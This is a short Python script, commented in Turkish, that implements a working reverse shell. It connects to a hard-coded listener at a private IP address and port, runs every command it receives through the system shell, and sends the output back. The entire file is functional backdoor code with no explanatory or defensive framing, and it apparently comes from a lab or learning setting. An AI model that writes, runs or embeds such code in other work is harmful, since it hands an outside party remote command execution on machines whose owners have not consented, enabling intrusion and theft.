import socket
import os
import subprocess

# Sunucu IP ve port
target_ip = '192.168.80.135'  # Dinleyici IP'si
target_port = 9999              # Dinleyici portu

# Socket oluşturuluyor
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_ip, target_port))

while True:
    command = client.recv(4096).decode()
    if command.lower() == "exit":
        break
    if command.lower().startswith("cd "):
        os.chdir(command.split(" ")[1])
        client.send(b"Directory changed to " + os.getcwd().encode())
    else:
        output = subprocess.getoutput(command)
        client.send(output.encode())

client.close()